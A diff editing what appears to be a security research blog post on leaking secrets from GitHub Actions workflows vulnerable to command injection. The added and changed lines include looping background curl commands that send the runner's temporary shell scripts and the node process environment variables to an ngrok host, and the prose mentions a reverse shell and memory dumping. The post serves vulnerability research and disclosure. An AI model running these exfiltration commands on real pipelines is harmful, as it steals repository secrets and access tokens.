@@ -166,6 +166,16 @@ Before executing a job, _Runner.Worker_ must translate the job details into exec
 
 (Note that I am running a reverse shell from the runner machine. You can alternatively read the values from the build logs or exfiltrate them.)
 
+This will also print shell actions that have executed in a previous step. For future shell actions, we create an asynchronous process that continuously exfiltrates `.sh` files from `/home/runner/work/_temp`:[^4]
+
+[^4]: I am exfiltrating values to an HTTP ngrok instance. ngrok is an ingress tool useful for exposing local ports.
+
+```sh
+while true; do curl -s 'https://4ddc-91-197-46-143.ngrok.io' -H "Content-Type: text/plain" -d "$(cat /home/runner/work/_temp/*)" -o /dev/null; done &
+```
+
+![Screenshot of the exfiltrated shell scripts in ngrok. Contains API_KEY secret.](/images/github-actions-leaking-secrets/41RqzNm2.png)
+
 Another type of step is the JavaScript action. It contains a `action.yml` manifest that specifies input arguments and a JavaScript file to execute with Node.js. A workflow step then references the action with the `uses` key and passes arguments using `with`:
 
 ```yaml
@@ -176,19 +186,15 @@ Another type of step is the JavaScript action. It contains a `action.yml` manife
     example_argument_2: "Hello world"
 ```
 
-Unlike with shell actions, _Runner.Worker_ doesn't hardcode secrets into JavaScript actions. JavaScript actions instead receive input values through environment variables—passed into the Node.js process. To expose those secrets, we read the environment variables of future Node.js processes, after our command injection step has terminated. We can do this with an asynchronous process:[^4]
-
-[^4]: I am exfiltrating values to an HTTP ngrok instance. ngrok is an ingress tool useful for exposing local ports.
+Unlike with shell actions, _Runner.Worker_ doesn't hardcode secrets into JavaScript actions. JavaScript actions instead receive input values through environment variables—passed into the Node.js process. To expose those secrets, we asynchronously read the environment variables of future Node.js processes:
 
 ```sh
-while true; do curl -s -o /dev/null 'https://1e8b-94-187-0-56.ngrok.io' -d "data=$(ps axe | grep node | base64)"; done &
+while true; do curl -s 'https://4ddc-91-197-46-143.ngrok.io' -H "Content-Type: text/plain"  -d "$(ps axe | grep node)" -o /dev/null; done &
 ```
-
-![Screenshot of ngrok receiving a post request with a data field including base64-ed data (the leaked environment variables.)](/images/github-actions-leaking-secrets/6vlBIiK.png)
 
 ![Screenshot of the dumped environment variables. "INPUT_EXAMPLE_ARGUMENT_1=SECRET VALUE" is highlighted.](/images/github-actions-leaking-secrets/dKOEN7u.png)
 
-We have now made progress: we can leak secrets of shell  and JavaScript actions, not just secrets referenced in environment variables. These techniques have been similarly documented by Alex Ilgayev from Cycode.[^5]
+We have now made progress: we can leak secrets of shell and JavaScript actions, not just secrets referenced in environment variables. These techniques have been similarly documented by Alex Ilgayev from Cycode.[^5]
 
 [^5]: You can read Alex's analysis of GitHub Actions command injection at [https://cycode.com/github-actions-vulnerabilities/](https://cycode.com/github-actions-vulnerabilities/)
 
@@ -251,6 +257,8 @@ There is an exceptions ofcourse. Organizations and repositories can enforce read
 ## Conclusion
 
 To leak secrets from GitHub Actions workflows vulnerable to command injection, we explored three different ideas: reading files and environment variables, intercepting network/process communication, and dumping memory. We leaked secrets of any shell action by reading its corresponding `.sh` file. Similarly, we read environment variables of JavaScript Actions to reveal secrets passed as input. However, these methods were not sufficient for all workflows: we couldn't access JavaScript actions that were defined in a step before our command injection step or that had a strict execution condition. Moreover, we couldn't do much with workflows that didn't reference secrets. From the network analysis, we knew that the _Runner.Listener_ received all the secrets at once. But network or IPC interception wouldn't work: the command injection runs after the job details are received, since it is part of the job's steps. Memory dumping _Runner.Listener_ proved to be the golden method. It revealed to us all the referenced secrets, in addition to a write-access GitHub access token. All this to prove one thing: that vulnerable workflows can't keep a secret.
+
+I would like to thank EdOverflow, Alvin Ng, Jeffrey Hertzog, and BBAC for helping me write this blogpost <3
 
 ## References
 
